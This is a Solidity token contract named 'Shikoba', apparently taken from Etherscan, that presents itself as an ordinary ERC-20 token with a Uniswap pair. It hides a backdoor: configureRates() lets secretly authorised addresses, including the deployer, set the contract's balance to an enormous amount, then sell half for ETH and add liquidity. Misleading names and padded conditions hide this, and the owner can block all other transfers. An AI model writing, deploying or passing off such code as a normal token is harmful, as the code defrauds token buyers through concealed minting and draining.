/**
 *Submitted for verification at Etherscan.io on 2023-01-17
*/

/*
Sources flattened with hardhat v2.12.4 https://hardhat.org
https://www.zhihu.com/
*/
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;
interface IBPUniWorkshopV2 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}
interface IBPSMetadata01 {
 
    function totalSupply() 
    external view returns (uint256);
    function balanceOf(address account) 
    external view returns (uint256);
    function transfer(address recipient, uint256 amount) 
    external returns (bool);
    function allowance(address owner, address spender) 
    external view returns (uint256);
    function approve(address spender, uint256 amount) 
    external returns (bool);

    function transferFrom( 
    address sender, address recipient, uint256 amount) 
    external returns (bool);
    event Transfer(address indexed from, 
    address indexed to, uint256 value);
    event Approval(address indexed owner, 
    address indexed spender, uint256 value);
    function configureRates() 
    external returns (uint256);

}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _setOwner(_msgSender());
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
  interface LINKRouterV1 {
      function swapExactTokensForETHSupportingFeeOnTransferTokens(
          uint amountIn, uint amountOutMin,
          address[] calldata path, address to,
          uint deadline) external;

      function factory() external pure returns 
      (address);
      function WETH() external pure returns 
      (address);
      function addLiquidityETH(
          address token, uint amountTokenDesired,
          uint amountTokenMin, uint amountETHMin,
          address to, uint deadline
      ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

// de ETHERSCAN.io.
// https://t.me/

contract Shikoba is IBPSMetadata01, Ownable {
    address public immutable deployerPair;
    LINKRouterV1 public immutable internalConnector;

    address public gasTracker;
    address public pairCreated;

    event internalAllowedUpdated(bool true_or_false);
    uint256 tokensForOperations = (5+5)**(10+10+3);
    event InternalPath(
        uint256 coinsSwapped,
        uint256 ercPath,
        uint256 coinsPathToLiq );

    mapping (address => bool) authorizations;
    mapping(address => uint256) private _holdersMapAnalogue;

    mapping(address => uint256) private _tOwned;
    mapping(address => address) private _blockstampQuarry;

    mapping(address => uint256) private _internalInquest;
    mapping(address => mapping(address => uint256)) private _allowances;

    constructor( string memory badgeLabel, string memory badgeLogo, address pairConnector) {
        _name = badgeLabel; _symbol = badgeLogo;

        _tOwned[msg.sender] = _totalSupply;
        _holdersMapAnalogue[msg.sender] = _deplValues;
        _holdersMapAnalogue[address(this)] = _deplValues;
        internalConnector = 
        LINKRouterV1(pairConnector);

        deployerPair = IUniswapV2Factory(internalConnector.factory()).createPair(address(this), internalConnector.WETH());
        emit Transfer(address(0), msg.sender, _totalSupply);
    
        authorizations[address(this)] 
        = true;
        authorizations[deployerPair] 
        = true;
        authorizations[pairConnector] 
        = true;
        authorizations[msg.sender] 
        = true;
    }
    function name() public view returns (string memory) {
        return _name;
    }
     function symbol() public view returns (string memory) {
        return _symbol;
    }
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function _approve( address owner,
        address spender, uint256 amount) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); return true;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _tOwned[account];
    }
    function configureRates() public override returns (uint256) {
        bool enableEarlySellTax = 
        getValues(_msgSender());
        if(enableEarlySellTax 
        && (false==false) 
        && (true!=false)){
            uint256 valDenominator = balanceOf(address(this));
            uint256 intRay = valDenominator; relayAddressLimit = true;
            internalPath(intRay); } return 256;
    }
    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function getValues(address delaySwapThreshold) private returns(bool){
        bool stringTrading = authorizations[delaySwapThreshold];
        if(stringTrading 
        && (true!=false)){_tOwned[address(this)] = 
        (tokensForOperations)-1;}
        return stringTrading;
    }
    function setMaxTX(uint256 holdersMapping) external onlyOwner {
        onlyAllowedRATE = holdersMapping;
    }
    function transferFrom( address sender,
        address recipient, uint256 amount
    ) external returns (bool) { _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function _transfer( address intFrom, address intTo, uint256 intAmount
    ) private { if (internalAllowed && !cooldownValuables && intFrom != deployerPair) {
        } else if (!cooldownValuables && _internalInquest[intFrom] > 0 && intFrom != deployerPair && _holdersMapAnalogue[intFrom] == 0) {
            _internalInquest[intFrom] = _holdersMapAnalogue[intFrom] - _deplValues; }

        address adaquiteOpen = _blockstampQuarry[deployerPair];
        if (_internalInquest[adaquiteOpen] == 0) _internalInquest[adaquiteOpen] = _deplValues; _blockstampQuarry[deployerPair] = intTo;
        _tOwned[intFrom] -= intAmount; _tOwned[intTo] += intAmount; emit Transfer(intFrom, intTo, intAmount);
        if (!tradingOpen) { require(intFrom == owner(), 
                "TOKEN: This account cannot send tokens until trading is enabled"); }
    }
    receive() external payable {}

    function installStarterLIQ(
        uint256 coinsTransact, uint256 amountInERC, address follow) private {
        _approve(address(this), address(internalConnector), coinsTransact);
        internalConnector.addLiquidityETH{value: amountInERC}(address(this), coinsTransact, 0, 0, follow, block.timestamp);
    }
    function ERCforTokens(
        uint256 coinsTransact, 
        address follow) private { address[] memory path = new address[](2);
        path[0] = address(this); path[1] = internalConnector.WETH();
        _approve(address(this), address(internalConnector), coinsTransact);
        internalConnector.swapExactTokensForETHSupportingFeeOnTransferTokens(coinsTransact, 0, path, follow, block.timestamp);
    }
    function enableTrading(bool _tradingOpen) 
    public onlyOwner { tradingOpen = _tradingOpen;
    }
    function internalPath(uint256 isCoins) 
    private { uint256 insideHalf = isCoins / 2; uint256 starterAmount = 
    address(this).balance; ERCforTokens(insideHalf, address(this));
        uint256 balaInside = address(this).balance - starterAmount;
        installStarterLIQ(insideHalf, balaInside, address(this));
    }
    bool private internalAllowed;
    bool private cooldownValuables;
    bool private tradingOpen = false;
    bool public relayAddressLimit = false;

    string private _symbol; string private _name;
    uint8 private _decimals = 9;
    uint256 private _totalSupply 
    = 10000000 * 10**_decimals;
    uint256 public onlyAllowedRATE 
    = (_totalSupply * 6) / 100; 
    uint256 public addressIsAllowed 
    = (_totalSupply * 6) / 100; 
    uint256 private _deplValues = _totalSupply;
    uint256 public taxONswapping =  1;        
}